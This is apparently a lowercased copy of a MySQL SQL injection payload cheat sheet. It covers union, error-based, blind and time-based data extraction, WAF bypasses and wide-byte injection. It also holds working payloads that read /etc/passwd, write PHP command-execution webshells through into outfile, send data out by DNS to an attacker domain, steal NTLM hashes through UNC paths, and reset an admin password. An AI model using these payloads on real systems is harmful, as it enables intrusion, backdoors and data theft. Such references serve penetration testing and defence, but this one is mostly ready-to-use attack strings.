# mysql injection

> mysql injection  is a type of security vulnerability that occurs when an attacker is able to manipulate the sql queries made to a mysql database by injecting malicious input. this vulnerability is often the result of improperly handling user input, allowing attackers to execute arbitrary sql code that can compromise the database's integrity and security.


## summary

* [mysql default databases](#mysql-default-databases)
* [mysql comments](#mysql-comments)
* [mysql testing injection](#mysql-testing-injection)
* [mysql union based](#mysql-union-based)
    * [detect columns number](#detect-columns-number)
        * [iterative null method](#iterative-null-method)
        * [order by method](#order-by-method)
        * [limit into method](#limit-into-method)
    * [extract database with information_schema](#extract-database-with-information_schema)
    * [extract columns name without information_schema](#extract-columns-name-without-information_schema)
    * [extract data without columns name](#extract-data-without-columns-name)
* [mysql error based](#mysql-error-based)
    * [mysql error based - basic](#mysql-error-based---basic)
    * [mysql error based - updatexml function](#mysql-error-based---updatexml-function)
    * [mysql error based - extractvalue function](#mysql-error-based---extractvalue-function)
* [mysql blind](#mysql-blind)
    * [mysql blind with substring equivalent](#mysql-blind-with-substring-equivalent)
    * [mysql blind using a conditional statement](#mysql-blind-using-a-conditional-statement)
    * [mysql blind with make_set](#mysql-blind-with-make_set)
    * [mysql blind with like](#mysql-blind-with-like)
    * [mysql blind with regexp](#mysql-blind-with-regexp)
* [mysql time based](#mysql-time-based)
    * [using sleep in a subselect](#using-sleep-in-a-subselect)
    * [using conditional statements](#using-conditional-statements)
* [mysql dios - dump in one shot](#mysql-dios---dump-in-one-shot)
* [mysql current queries](#mysql-current-queries)
* [mysql read content of a file](#mysql-read-content-of-a-file)
* [mysql command execution](#mysql-command-execution)
    * [webshell - outfile method](#shell---outfile-method)
    * [webshell - dumpfile method](#shell---dumpfile-method)
    * [command - udf library](#udf-library)
* [mysql insert](#mysql-insert)
* [mysql truncation](#mysql-truncation)
* [mysql out of band](#mysql-out-of-band)
    * [dns exfiltration](#dns-exfiltration)
    * [unc path - ntlm hash stealing](#unc-path---ntlm-hash-stealing)
* [mysql waf bypass](#mysql-waf-bypass)
    * [alternative to information schema](#alternative-to-information-schema)
    * [alternative to version](#alternative-to-version)
    * [alternative to group_concat](#alternative-to-group_concat)
    * [scientific notation](#scientific-notation)
    * [conditional comments](#conditional-comments)
    * [wide byte injection (gbk)](#wide-byte-injection-gbk)
* [references](#references)


## mysql default databases

| name               | description              |
|--------------------|--------------------------|
| mysql              | requires root privileges |
| information_schema | available from version 5 and higher |
	

## mysql comments

mysql comments are annotations in sql code that are ignored by the mysql server during execution.

| type                       | description                       |
|----------------------------|-----------------------------------|
| `#`                        | hash comment                      |
| `/* mysql comment */`      | c-style comment                   |
| `/*! mysql special sql */` | special sql                       |
| `/*!32302 10*/`            | comment for mysql version 3.23.02 |
| `--`                       | sql comment                       |
| `;%00`                     | nullbyte                          |
| \`                         | backtick                          |


## mysql testing injection

* **strings**: query like `select * from table where id = 'fuzz';`
    ```
    '	false
    ''	true
    "	false
    ""	true
    \	false
    \\	true
    ```

* **numeric**: query like `select * from table where id = fuzz;`
    ```ps1
    and 1	    true
    and 0	    false
    and true	true
    and false	false
    1-false	    returns 1 if vulnerable
    1-true	    returns 0 if vulnerable
    1*56	    returns 56 if vulnerable
    1*56	    returns 1 if not vulnerable
    ```

* **login**: query like `select * from users where username = 'fuzz1' and password = 'fuzz2';`
    ```ps1
    ' or '1
    ' or 1 -- -
    " or "" = "
    " or 1 = 1 -- -
    '='
    'like'
    '=0--+
    ```


## mysql union based

### detect columns number

to successfully perform a union-based sql injection, an attacker needs to know the number of columns in the original query.


#### iterative null method

systematically increase the number of columns in the `union select` statement until the payload executes without errors or produces a visible change. each iteration checks the compatibility of the column count.

```sql
union select null;--
union select null, null;-- 
union select null, null, null;-- 
```


#### order by method

keep incrementing the number until you get a `false` response. even though `group by` and `order by` have different functionality in sql, they both can be used in the exact same fashion to determine the number of columns in the query.

| order by        | group by        | result |
| --------------- | --------------- | ------ |
| `order by 1--+` | `group by 1--+` | true   |
| `order by 2--+` | `group by 2--+` | true   |
| `order by 3--+` | `group by 3--+` | true   |
| `order by 4--+` | `group by 4--+` | false  |

since the result is false for `order by 4`, it means the sql query is only having 3 columns.
in the `union` based sql injection, you can `select` arbitrary data to display on the page: `-1' union select 1,2,3--+`.

similar to the previous method, we can check the number of columns with one request if error showing is enabled.

```sql
order by 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+ # unknown column '4' in 'order clause'
```


#### limit into method

this method is effective when error reporting is enabled. it can help determine the number of columns in cases where the injection point occurs after a limit clause. 

| payload                      | error           |
| ---------------------------- | --------------- |
| `1' limit 1,1 into @--+`     | `the used select statements have a different number of columns` |
| `1' limit 1,1 into @,@--+ `  | `the used select statements have a different number of columns` |
| `1' limit 1,1 into @,@,@--+` | `no error means query uses 3 columns` |

since the result doesn't show any error it means the query uses 3 columns: `-1' union select 1,2,3--+`.


### extract database with information_schema

this query retrieves the names of all schemas (databases) on the server.

```sql
union select 1,2,3,4,...,group_concat(0x7c,schema_name,0x7c) from information_schema.schemata
```

this query retrieves the names of all tables within a specified schema (the schema name is represented by placeholder).

```sql
union select 1,2,3,4,...,group_concat(0x7c,table_name,0x7c) from information_schema.tables where table_schema=placeholder
```

this query retrieves the names of all columns in a specified table.

```sql
union select 1,2,3,4,...,group_concat(0x7c,column_name,0x7c) from information_schema.columns where table_name=...
```

this query aims to retrieve data from a specific table.

```sql
union select 1,2,3,4,...,group_concat(0x7c,data,0x7c) from ...
```


### extract columns name without information_schema

method for `mysql >= 4.1`.

| payload | output |
| --- | --- |
| `(1)and(select * from db.users)=(1)` | operand should contain **4** column(s) |
| `1 and (1,2,3,4) = (select * from db.users union select 1,2,3,4 limit 1)` | column '**id**' cannot be null |

method for `mysql 5`

| payload | output |
| --- | --- |
| `union select * from (select * from users join users b)a` | duplicate column name '**id**' |
| `union select * from (select * from users join users b using(id))a` | duplicate column name '**name**' |
| `union select * from (select * from users join users b using(id,name))a` | data |


### extract data without columns name 

extracting data from the 4th column without knowing its name.

```sql
select `4` from (select 1,2,3,4,5,6 union select * from users)dbname;
```

injection example inside the query `select author_id,title from posts where author_id=[inject_here]`

```sql
mariadb [dummydb]> select author_id,title from posts where author_id=-1 union select 1,(select concat(`3`,0x3a,`4`) from (select 1,2,3,4,5,6 union select * from users)a limit 1,1);
+-----------+-----------------------------------------------------------------+
| author_id | title                                                           |
+-----------+-----------------------------------------------------------------+
|         1 | a45d4e080fc185dfa223aea3d0c371b6cc180a37:veronica80@example.org |
+-----------+-----------------------------------------------------------------+
```


## mysql error based

| name         | payload         |
| ------------ | --------------- |
| gtid_subset  | `and gtid_subset(concat('~',(select version()),'~'),1337) -- -` |
| json_keys    | `and json_keys((select convert((select concat('~',(select version()),'~')) using utf8))) -- -` |
| extractvalue | `and extractvalue(1337,concat('.','~',(select version()),'~')) -- -` |
| updatexml    | `and updatexml(1337,concat('.','~',(select version()),'~'),31337) -- -` |
| exp          | `and exp(~(select * from (select concat('~',(select version()),'~','x'))x)) -- -` |
| or           | `or 1 group by concat('~',(select version()),'~',floor(rand(0)*2)) having min(0) -- -` |
| name_const   | `and (select * from (select name_const(version(),1),name_const(version(),1)) as x)--` |
| uuid_to_bin  | `and uuid_to_bin(version())='1` |


### mysql error based - basic

works with `mysql >= 4.1`

```sql
(select 1 and row(1,1)>(select count(*),concat(concat(@@version),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
'+(select 1 and row(1,1)>(select count(*),concat(concat(@@version),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+'
```


### mysql error based - updatexml function

```sql
and updatexml(rand(),concat(char(126),version(),char(126)),null)-
and updatexml(rand(),concat(0x3a,(select concat(char(126),schema_name,char(126)) from information_schema.schemata limit data_offset,1)),null)--
and updatexml(rand(),concat(0x3a,(select concat(char(126),table_name,char(126)) from information_schema.tables where table_schema=data_column limit data_offset,1)),null)--
and updatexml(rand(),concat(0x3a,(select concat(char(126),column_name,char(126)) from information_schema.columns where table_name=data_table limit data_offset,1)),null)--
and updatexml(rand(),concat(0x3a,(select concat(char(126),data_info,char(126)) from data_table.data_column limit data_offset,1)),null)--
```

shorter to read:

```sql
updatexml(null,concat(0x0a,version()),null)-- -
updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),null)-- -
```


### mysql error based - extractvalue function

works with `mysql >= 5.1`

```sql
?id=1 and extractvalue(rand(),concat(char(126),version(),char(126)))--
?id=1 and extractvalue(rand(),concat(0x3a,(select concat(char(126),schema_name,char(126)) from information_schema.schemata limit data_offset,1)))--
?id=1 and extractvalue(rand(),concat(0x3a,(select concat(char(126),table_name,char(126)) from information_schema.tables where table_schema=data_column limit data_offset,1)))--
?id=1 and extractvalue(rand(),concat(0x3a,(select concat(char(126),column_name,char(126)) from information_schema.columns where table_name=data_table limit data_offset,1)))--
?id=1 and extractvalue(rand(),concat(0x3a,(select concat(char(126),data_column,char(126)) from data_schema.data_table limit data_offset,1)))--
```


### mysql error based - name_const function (only for constants)

works with `mysql >= 5.0`

```sql
?id=1 and (select * from (select name_const(version(),1),name_const(version(),1)) as x)--
?id=1 and (select * from (select name_const(user(),1),name_const(user(),1)) as x)--
?id=1 and (select * from (select name_const(database(),1),name_const(database(),1)) as x)--
```


## mysql blind

### mysql blind with substring equivalent

| function | example | description |
| --- | --- | --- |
| `substr` | `substr(version(),1,1)=5` | extracts a substring from a string (starting at any position) |
| `substring` | `substring(version(),1,1)=5` | extracts a substring from a string (starting at any position) |
| `right` | `right(left(version(),1),1)=5` | extracts a number of characters from a string (starting from right) |
| `mid` | `mid(version(),1,1)=4` | extracts a substring from a string (starting at any position) |
| `left` | `left(version(),1)=4` | extracts a number of characters from a string (starting from left) |

examples of blind sql injection using `substring` or another equivalent function:

```sql
?id=1 and select substr(table_name,1,1) from information_schema.tables > 'a'
?id=1 and select substr(column_name,1,1) from information_schema.columns > 'a'
?id=1 and ascii(lower(substr(version(),1,1)))=51
```


### mysql blind using a conditional statement

* true: `if @@version starts with a 5`:

    ```sql
    2100935' or if(mid(@@version,1,1)='5',sleep(1),1)='2
    response:
    http/1.1 500 internal server error
    ```

* false: `if @@version starts with a 4`:

    ```sql
    2100935' or if(mid(@@version,1,1)='4',sleep(1),1)='2
    response:
    http/1.1 200 ok
    ```


### mysql blind with make_set

```sql
and make_set(value_to_extract<(select(length(version()))),1)
and make_set(value_to_extract<ascii(substring(version(),pos,1)),1)
and make_set(value_to_extract<(select(length(concat(login,password)))),1)
and make_set(value_to_extract<ascii(substring(concat(login,password),pos,1)),1)
```


### mysql blind with like

in mysql, the `like` operator can be used to perform pattern matching in queries. the operator allows the use of wildcard characters to match unknown or partial string values. this is especially useful in a blind sql injection context when an attacker does not know the length or specific content of the data stored in the database.

wildcard characters in like:

* **percentage sign** (`%`): this wildcard represents zero, one, or multiple characters. it can be used to match any sequence of characters.
* **underscore** (`_`): this wildcard represents a single character. it's used for more precise matching when you know the structure of the data but not the specific character at a particular position.

```sql
select cust_code from customer where cust_name like 'k__l';
select * from products where product_name like '%user_input%'
```


### mysql blind with regexp

blind sql injection can also be performed using the mysql `regexp` operator, which is used for matching a string against a regular expression. this technique is particularly useful when attackers want to perform more complex pattern matching than what the `like` operator can offer.

| payload | description |
| --- | --- |
| `' or (select username from users where username regexp '^.{8,}$') --` | checking length |
| `' or (select username from users where username regexp '[0-9]') --`   | checking for the presence of digits |
| `' or (select username from users where username regexp '^a[a-z]') --` | checking for data starting by "a" |


## mysql time based

the following sql codes will delay the output from mysql.

* mysql 4/5 : [`benchmark()`](https://dev.mysql.com/doc/refman/8.4/en/select-benchmarking.html)
    ```sql
    +benchmark(40000000,sha1(1337))+
    '+benchmark(3200,sha1(1))+'
    and [randnum]=benchmark([sleeptime]000000,md5('[randstr]'))
    ```

* mysql 5: [`sleep()`](https://dev.mysql.com/doc/refman/8.4/en/miscellaneous-functions.html#function_sleep)
    ```sql
    rlike sleep([sleeptime])
    or elt([randnum]=[randnum],sleep([sleeptime]))
    xor(if(now()=sysdate(),sleep(5),0))xor
    and sleep(10)=0
    and (select 1337 from (select(sleep(10-(if((1=1),0,10))))) randstr)
    ```

### using sleep in a subselect

extracting the length of the data.

```sql
1 and (select sleep(10) from dual where database() like '%')#
1 and (select sleep(10) from dual where database() like '___')# 
1 and (select sleep(10) from dual where database() like '____')#
1 and (select sleep(10) from dual where database() like '_____')#
```

extracting the first character.

```sql
1 and (select sleep(10) from dual where database() like 'a____')#
1 and (select sleep(10) from dual where database() like 's____')#
```

extracting the second character.

```sql
1 and (select sleep(10) from dual where database() like 'sa___')#
1 and (select sleep(10) from dual where database() like 'sw___')#
```

extracting the third character.

```sql
1 and (select sleep(10) from dual where database() like 'swa__')#
1 and (select sleep(10) from dual where database() like 'swb__')#
1 and (select sleep(10) from dual where database() like 'swi__')#
```

extracting column_name.

```sql
1 and (select sleep(10) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '%pass%' limit 0,1) like '%')#
```


### using conditional statements

```sql
?id=1 and if(ascii(substring((select user()),1,1))>=100,1, benchmark(2000000,md5(now()))) --
?id=1 and if(ascii(substring((select user()), 1, 1))>=100, 1, sleep(3)) --
?id=1 or if(mid(@@version,1,1)='5',sleep(1),1)='2
```


## mysql dios - dump in one shot

dios (dump in one shot) sql injection is an advanced technique that allows an attacker to extract entire database contents in a single, well-crafted sql injection payload. this method leverages the ability to concatenate multiple pieces of data into a single result set, which is then returned in one response from the database.

```sql
(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0d,0x0a,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7c))))a)#
(select (@) from (select(@:=0x00),(select (@) from (db_data.table_data) where (@)in (@:=concat(@,0x0d,0x0a,0x7c,' [ ',column_data1,' ] > ',column_data2,' > ',0x7c))))a)#
```

* securityidiots
    ```sql
    make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)
    ```

* profexer
    ```sql
    (select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3c62723e,table_name,0x3a,column_name))))a)
    ```

* dr.z3r0
    ```sql
    (select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@))
    ```

* m@dbl00d
    ```sql
    (select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))
    ```

* zen
    ```sql
    +make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)
    ```

* sharik
    ```sql
    (select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)
    ```


## mysql current queries

`information_schema.processlist` is a special table available in mysql and mariadb that provides information about active processes and threads within the database server. this table can list all operations that db is performing at the moment.

the `processlist` table contains several important columns, each providing details about the current processes. common columns include: 

* **id** : the process identifier.
* **user** : the mysql user who is running the process.
* **host** : the host from which the process was initiated.
* **db** : the database the process is currently accessing, if any.
* **command** : the type of command the process is executing (e.g., query, sleep).
* **time** : the time in seconds that the process has been running.
* **state** : the current state of the process.
* **info** : the text of the statement being executed, or null if no statement is being executed.
     
```sql
select * from information_schema.processlist;
```

| id  | user      | host 	         | db 	   | command | time | state      | info | 
| --- | --------- | ---------------- | ------- | ------- | ----	| ---------- | ---- | 
| 1	  | root	  | localhost        | testdb  | query	 | 10	| executing	 | select * from some_table | 
| 2	  | app_uset  | 192.168.0.101    | appdb   | sleep	 | 300	| sleeping	 | null |
| 3	  | gues_user | example.com:3360 | null	   | connect | 0    | connecting | null |


```sql
union select 1,state,info,4 from information_schema.processlist #
```

dump in one shot query to extract the whole content of the table.

```sql
union select 1,(select(@)from(select(@:=0x00),(select(@)from(information_schema.processlist)where(@)in(@:=concat(@,0x3c62723e,state,0x3a,info))))a),3,4 #
```


## mysql read content of a file

need the `filepriv`, otherwise you will get the error : `error 1290 (hy000): the mysql server is running with the --secure-file-priv option so it cannot execute this statement`

```sql
union all select load_file('/etc/passwd') --
union all select to_base64(load_file('/var/www/html/index.php'));
```

if you are `root` on the database, you can re-enable the `load_file` using the following query

```sql
grant file on *.* to 'root'@'localhost'; flush privileges;#
```

## mysql command execution

### webshell - outfile method

```sql
[...] union select "<?php system($_get['cmd']); ?>" into outfile "c:\\xampp\\htdocs\\backdoor.php"
[...] union select '' into outfile '/var/www/html/x.php' fields terminated by '<?php phpinfo();?>'
[...] union select 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'c:\\wamp\\www\\pwnd.php'-- -
[...] union all select 1,2,3,4,"<?php echo shell_exec($_get['cmd']);?>",6 into outfile 'c:/inetpub/wwwroot/backdoor.php'
```

### webshell - dumpfile method

```sql
[...] union select 0xphp_payload_in_hex, null, null into dumpfile 'c:/program files/easyphp-12.1/www/shell.php'
[...] union select 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e into dumpfile '/var/www/html/images/shell.php';
```

### command - udf library

first you need to check if the udf are installed on the server.

```powershell
$ whereis lib_mysqludf_sys.so
/usr/lib/lib_mysqludf_sys.so
```

then you can use functions such as `sys_exec` and `sys_eval`.

```sql
$ mysql -u root -p mysql
enter password: [...]

mysql> select sys_eval('id');
+--------------------------------------------------+
| sys_eval('id') |
+--------------------------------------------------+
| uid=118(mysql) gid=128(mysql) groups=128(mysql) |
+--------------------------------------------------+
```


## mysql insert

`on duplicate key update` keywords is used to tell mysql what to do when the application tries to insert a row that already exists in the table. we can use this to change the admin password by:

inject using payload:

```sql
attacker_dummy@example.com", "p@ssw0rd"), ("admin@example.com", "p@ssw0rd") on duplicate key update password="p@ssw0rd" --
```

the query would look like this:

```sql
insert into users (email, password) values ("attacker_dummy@example.com", "bcrypt_hash"), ("admin@example.com", "p@ssw0rd") on duplicate key update password="p@ssw0rd" -- ", "bcrypt_hash_of_your_password_input");
```

this query will insert a row for the user "attacker_dummy@example.com". it will also insert a row for the user "admin@example.com".

because this row already exists, the `on duplicate key update` keyword tells mysql to update the `password` column of the already existing row to "p@ssw0rd". after this, we can simply authenticate with "admin@example.com" and the password "p@ssw0rd".


## mysql truncation

in mysql "`admin `" and "`admin`" are the same. if the username column in the database has a character-limit the rest of the characters are truncated. so if the database has a column-limit of 20 characters and we input a string with 21 characters the last 1 character will be removed.

```sql
`username` varchar(20) not null
```

payload: `username = "admin               a"`


## mysql out of band

```powershell
select @@version into outfile '\\\\192.168.0.100\\temp\\out.txt';
select @@version into dumpfile '\\\\192.168.0.100\\temp\\out.txt;
```

### dns exfiltration

```sql
select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
select load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874))
```

### unc path - ntlm hash stealing

the term "unc path" refers to the universal naming convention path used to specify the location of resources such as shared files or devices on a network. it is commonly used in windows environments to access files over a network using a format like `\\server\share\file`.

```sql
select load_file('\\\\error\\abc');
select load_file(0x5c5c5c5c6572726f725c5c616263);
select '' into dumpfile '\\\\error\\abc';
select '' into outfile '\\\\error\\abc';
load data infile '\\\\error\\abc' into table database.table_name;
```

:warning: don't forget to escape the '\\\\'.


## mysql waf bypass

### alternative to information schema

`information_schema.tables` alternative

```sql
select * from mysql.innodb_table_stats;
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
| database_name  | table_name            | last_update         | n_rows | clustered_index_size | sum_of_other_index_sizes |
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
| dvwa           | guestbook             | 2017-01-19 21:02:57 |      0 |                    1 |                        0 |
| dvwa           | users                 | 2017-01-19 21:03:07 |      5 |                    1 |                        0 |
...
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+

mysql> show tables in dvwa;
+----------------+
| tables_in_dvwa |
+----------------+
| guestbook      |
| users          |
+----------------+
```


### alternative to version

```sql
mysql> select @@innodb_version;
+------------------+
| @@innodb_version |
+------------------+
| 5.6.31           |
+------------------+

mysql> select @@version;
+-------------------------+
| @@version               |
+-------------------------+
| 5.6.31-0ubuntu0.15.10.1 |
+-------------------------+

mysql> select version();
+-------------------------+
| version()               |
+-------------------------+
| 5.6.31-0ubuntu0.15.10.1 |
+-------------------------+

mysql> select @@global.version;
+------------------+
| @@global.version |
+------------------+
| 8.0.27           |
+------------------+
```


### alternative to group_concat

requirement: `mysql >= 5.7.22`

use `json_arrayagg()` instead of `group_concat()` which allows less symbols to be displayed

* `group_concat()` = 1024 symbols
* `json_arrayagg()` > 16,000,000 symbols

```sql
select json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from information_schema.tables;
```


### scientific notation

in mysql, the e notation is used to represent numbers in scientific notation. it's a way to express very large or very small numbers in a concise format. the e notation consists of a number followed by the letter e and an exponent.
the format is: `base 'e' exponent`.

for example:

* `1e3` represents `1 x 10^3` which is `1000`. 
* `1.5e3` represents `1.5 x 10^3` which is `1500`. 
* `2e-3` represents `2 x 10^-3` which is `0.002`. 

the following queries are equivalent:

* `select table_name from information_schema 1.e.tables` 
* `select table_name from information_schema .tables` 

in the same way, the common payload to bypass authentication `' or ''='` is equivalent to `' or 1.e('')='` and `1' or 1.e(1) or '1'='1`. 
this technique can be used to obfuscate queries to bypass waf, for example: `1.e(ascii 1.e(substring(1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e) = 70 or'1'='2` 


### conditional comments

mysql conditional comments are enclosed within `/*! ... */` and can include a version number to specify the minimum version of mysql that should execute the contained code.
the code inside this comment will be executed only if the mysql version is greater than or equal to the number immediately following the `/*!`. if the mysql version is less than the specified number, the code inside the comment will be ignored. 

* `/*!12345union*/`: this means that the word union will be executed as part of the sql statement if the mysql version is 12.345 or higher.
* `/*!31337select*/`: similarly, the word select will be executed if the mysql version is 31.337 or higher.

**examples**: `/*!12345union*/`, `/*!31337select*/`


### wide byte injection (gbk)

wide byte injection is a specific type of sql injection attack that targets applications using multi-byte character sets, like gbk or sjis. the term "wide byte" refers to character encodings where one character can be represented by more than one byte. this type of injection is particularly relevant when the application and the database interpret multi-byte sequences differently.

the `set names gbk` query can be exploited in a charset-based sql injection attack. when the character set is set to gbk, certain multibyte characters can be used to bypass the escaping mechanism and inject malicious sql code.

several characters can be used to triger the injection.

* `%bf%27`: this is a url-encoded representation of the byte sequence `0xbf27`. in the gbk character set, `0xbf27` decodes to a valid multibyte character followed by a single quote ('). when mysql encounters this sequence, it interprets it as a single valid gbk character followed by a single quote, effectively ending the string.
* `%bf%5c`: represents the byte sequence `0xbf5c`. in gbk, this decodes to a valid multi-byte character followed by a backslash (`\`). this can be used to escape the next character in the sequence.
* `%a1%27`: represents the byte sequence `0xa127`. in gbk, this decodes to a valid multi-byte character followed by a single quote (`'`).

a lot of payloads can be created such as:

```sql
%a8%27 or 1=1;--
%8c%a8%27 or 1=1--
%bf' or 1=1 -- --
```

here is a php example using gbk encoding and filtering the user input to escape backslash, single and double quote.

```php
function check_addslashes($string)
{
    $string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string);          //escape any backslash
    $string = preg_replace('/\'/i', '\\\'', $string);                               //escape single quote with a backslash
    $string = preg_replace('/\"/', "\\\"", $string);                                //escape double quote with a backslash
      
    return $string;
}

$id=check_addslashes($_get['id']);
mysql_query("set names gbk");
$sql="select * from users where id='$id' limit 0,1";
print_r(mysql_error());
```

here's a breakdown of how the wide byte injection works:

for instance, if the input is `?id=1'`, php will add a backslash, resulting in the sql query: `select * from users where id='1\'' limit 0,1`.

however, when the sequence `%df` is introduced before the single quote, as in `?id=1%df'`, php still adds the backslash. this results in the sql query: `select * from users where id='1%df\'' limit 0,1`. 

in the gbk character set, the sequence `%df%5c` translates to the character `連`. so, the sql query becomes: `select * from users where id='1連'' limit 0,1`. here, the wide byte character `連` effectively "eating" the added escape charactr, allowing for sql injection.

therefore, by using the payload `?id=1%df' and 1=1 --+`, after php adds the backslash, the sql query transforms into: `select * from users where id='1連' and 1=1 --+' limit 0,1`. this altered query can be successfully injected, bypassing the intended sql logic.


## references

- [[sqli] extracting data without knowing columns names - ahmed sultan - february 9, 2019](https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/)
- [a scientific notation bug in mysql left aws waf clients vulnerable to sql injection - marc olivier bergeron - october 19, 2021](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/)
- [alternative for information_schema.tables in mysql - osanda malith jayathissa - february 3, 2017](https://osandamalith.com/2017/02/03/alternative-for-information_schema-tables-in-mysql/)
- [ekoparty ctf 2016 (web 100) - p4-team - october 26, 2016](https://github.com/p4-team/ctf/tree/master/2016-10-26-ekoparty/web_100)
- [error based injection | netspi sql injection wiki - netspi - february 15, 2021](https://sqlwiki.netspi.com/injectiontypes/errorbased)
- [how to use sql calls to secure your web site - ipa isec - march 2010](https://www.ipa.go.jp/security/vuln/ps6vr70000011hc4-att/000017321.pdf)
- [mysql out of band hacking - osanda malith jayathissa - february 23, 2018](https://www.exploit-db.com/docs/english/41273-mysql-out-of-band-hacking.pdf)
- [sql injection - the oldschool way - 02 - ahmed sultan - january 1, 2025](https://www.youtube.com/watch?v=u91edo1cdak)
- [sql truncation attack - rohit shaw - june 29, 2014](https://resources.infosecinstitute.com/sql-truncation-attack/)
- [sqli filter evasion cheat sheet (mysql) - johannes dahse - december 4, 2010](https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/)
- [the sql injection knowledge base - roberto salgado - may 29, 2013](https://websec.ca/kb/sql_injection#mysql_default_databases)
